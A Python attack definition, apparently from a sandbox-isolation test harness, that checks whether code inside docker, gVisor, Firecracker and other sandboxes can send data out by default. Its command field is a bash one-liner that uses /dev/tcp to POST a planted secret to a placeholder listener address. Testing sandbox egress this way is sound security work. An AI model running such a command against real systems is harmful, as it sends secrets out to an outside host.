"""Network exfiltration over HTTP: can code inside the sandbox reach an external
endpoint at all? Tests the DEFAULT network policy -- no special config, since a
container has outbound network access unless something explicitly restricts it.

Uses bash's /dev/tcp pseudo-device instead of curl: the pinned base image
(ubuntu:24.04) doesn't include curl, and this way the attack doesn't depend on
any tool beyond bash, which is always present (confirmed against the live VM).
"""
from .base import Attack

ATTACK = Attack(
    name="network_http_exfil",
    category="network",
    description="POST a planted secret to the attacker listener over raw HTTP/TCP",
    # e2b needs network_https_exfil_e2b instead (TLS, tunnel). nono wraps a
    # real host process, which can reach the bridge gateway directly, same as
    # the VM host itself -- no special wiring needed, unlike e2b. openshell
    # runs its own sandboxed rootfs on this same VM host, so it reaches the
    # bridge gateway the same way docker/gvisor do. firecracker is on its own
    # tap link (targets/firecracker.py) rather than the Docker bridge, but
    # harness/run.py's LISTENER_BIND_OVERRIDE + attack_host handle that --
    # the attack script itself is unaware of which network it's actually on.
    targets=("docker", "gvisor", "nono", "openshell", "firecracker"),
    command=(
        "timeout {timeout_margin} bash -c '"
        'BODY="leak={secret}"; '
        'LEN=$(printf "%s" "$BODY" | wc -c); '
        "exec 3<>/dev/tcp/{listener_ip}/{listener_http_port}; "
        'printf "POST /exfil HTTP/1.0\\r\\nContent-Length: %d\\r\\n\\r\\n%s" "$LEN" "$BODY" >&3; '
        "timeout 2 cat <&3 >/dev/null"
        "'"
    ),
    timeout=8.0,
    notes=(
        "Tests default egress, not a specific misconfiguration. {timeout_margin} "
        "should be filled with a value a couple seconds under the Attack's own "
        "timeout, so the inner `timeout` can't outlive run()'s own watchdog."
    ),
)
